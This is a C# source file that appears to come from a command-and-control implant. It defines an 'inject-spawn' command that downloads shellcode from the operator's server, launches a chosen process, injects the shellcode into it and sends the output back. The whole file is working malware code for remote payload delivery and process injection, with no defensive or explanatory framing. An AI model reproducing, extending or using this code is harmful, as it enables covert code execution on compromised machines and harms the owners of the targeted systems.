using Agent.Internal;
using Agent.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class SpawnInjectCommand : AgentCommand
    {
        public override string Name => "inject-spawn";

        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
        {
            if (task.SplittedArgs.Length < 2)
            {
                result.Result = $"Usage: {this.Name} Path_Of_ShellCode_On_Server  Process_Name_To_Start";
                return;
            }

            var fileName = task.SplittedArgs[0];
            var fileContent = commm.Download(fileName, a =>
            {
                result.Info = $"Downloading {fileName} ({a}%)";
                commm.SendResult(result);
            }).Result;

            var shellcode = fileContent;

            this.Notify(result, commm, $"{fileName} Downloaded");

            var injectRes =  Injector.SpawnInjectWithOutput(fileContent, task.SplittedArgs[1]);
            if(!injectRes.Succeed)
                result.Result += $"Injection failed : {injectRes.Error}";
            else
            {
                result.Result += $"Injection succeed!" + Environment.NewLine;
                if (!string.IsNullOrEmpty(injectRes.Output))
                    result.Result += injectRes.Output;
            }
        }
    }
}
